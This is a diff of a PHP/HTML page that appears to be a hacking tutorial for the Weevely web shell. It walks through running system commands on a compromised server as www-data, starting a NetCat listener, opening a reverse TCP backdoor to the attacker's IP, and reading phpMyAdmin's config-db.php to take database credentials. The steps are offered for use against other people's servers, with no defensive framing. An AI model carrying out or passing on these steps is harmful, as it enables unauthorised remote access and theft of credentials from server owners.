@@ -96,9 +96,9 @@ require_once 'u.php';
     </fieldset>
     
     <fieldset>
-        <label>Step 2d.</label><b>www-data@192.168.2.29:  </b>
-        <code>ls</code><p>
-        <b>Format :</b> shell.sh (system_command)</p>
+        <label>Step 2d.</label><b>www-data@192.168.2.29-->  </b>
+        <code>:shell.sh ls</code><p>
+        <b>Format -></b> :shell.sh (system_command)</p>
     </fieldset>
         <fieldset>
             <label>Step 2e.</label>Use NetCat to listen for an incoming connection in your attacker computer
@@ -106,14 +106,14 @@ require_once 'u.php';
     </fieldset>
     <fieldset>
         <label>Step 2f.</label>Back to Weevely terminal opened in <b>step 2D</b>, after NetCat successfully listening on specific port, now  make a reverse TCP connection to our computer. 
-       <p><b>Type:</b> <code>backdoor.reverse_tcp your_ip 23</code></p>
+       <p><b>Type--></b> <code>:backdoor.reverse_tcp your_ip 23</code></p>
     </fieldset>
     <fieldset>
         <label>Step 2g.</label>If remote  server is a web server with MySQL database and PHPMyadmin installed.Try this in your 'netcat' terminal opened in <b>step 2E</b>
         <code>cat /etc/phpmyadmin/config-db.php</code>
     </fieldset>
      <fieldset>
-         <label>Note:</label> Use google to know more about <b>weevely</b>
+         <label>Note:</label> In terminal type <b>weevely help</b>
     </fieldset>
         
     
